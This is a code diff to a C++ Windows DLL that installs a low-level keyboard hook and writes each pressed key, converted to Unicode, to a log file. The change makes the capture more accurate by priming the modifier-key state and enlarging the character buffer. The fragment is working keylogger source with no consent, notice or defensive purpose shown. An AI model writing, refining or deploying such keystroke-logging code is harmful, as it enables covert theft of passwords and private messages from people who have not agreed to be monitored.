@@ -55,17 +55,23 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboardLL(int nCode, W
 		//Extracting the data
 		KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
 
-		if (wParam == WM_KEYDOWN) {
-			// Get the keyboard state			
+		if (wParam == WM_KEYDOWN)
+		{
 			BYTE keyboardState[256];
-			GetKeyboardState(keyboardState);
-
 			// Buffer to store the resulting Unicode character
-			WCHAR buffer[2];
+			WCHAR buffer[10];
 
-			// Convert the virtual key code to Unicode
-			int result = ToUnicode(data->vkCode, data->scanCode, keyboardState, buffer, 2, 0);
-			LogFile << buffer;
+			// Using this first so the GetKeyboardState retrieves the keys correctly
+			GetKeyState(VK_SHIFT);
+			GetKeyState(VK_MENU);
+			GetKeyState(VK_CONTROL);
+
+			if (GetKeyboardState(keyboardState)) {
+				if (ToUnicode(data->vkCode, data->scanCode, keyboardState, buffer, 10, 0) > 0)
+				{
+					LogFile << buffer;
+				}
+			}
 		}
 
 		// Close the file
